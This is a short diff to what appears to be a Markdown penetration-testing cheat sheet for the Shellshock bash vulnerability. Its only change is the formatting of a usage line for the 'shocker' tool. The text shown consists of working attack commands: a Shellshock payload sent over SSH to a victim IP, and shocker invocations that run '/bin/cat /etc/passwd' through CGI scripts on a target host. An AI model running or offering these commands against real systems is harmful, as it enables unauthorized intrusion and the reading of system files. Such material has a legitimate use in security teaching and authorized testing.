@@ -13,5 +13,7 @@ ssh username@$[victim_ip] '() { :;}; /bin/bash'
 ```
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 #### Tool
-***shocker***: https://github.com/nccgroup/shocker 
-- ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
+***shocker***: https://github.com/nccgroup/shocker
+``` 
+python shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
+```
